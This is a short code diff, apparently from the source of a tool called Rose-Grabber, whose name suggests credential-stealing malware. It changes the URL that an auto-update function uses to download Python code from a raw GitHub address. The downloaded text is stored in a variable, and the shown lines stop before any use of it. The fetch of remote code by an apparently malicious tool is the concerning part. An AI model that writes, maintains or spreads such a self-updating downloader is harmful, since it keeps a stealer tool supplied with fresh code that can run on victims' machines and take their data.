@@ -112,7 +112,7 @@ def auto_update():
         return 
     
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/v8.pyw"
+            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/builder.py"
     )
     
     code = requests.get(_code, timeout=10).text
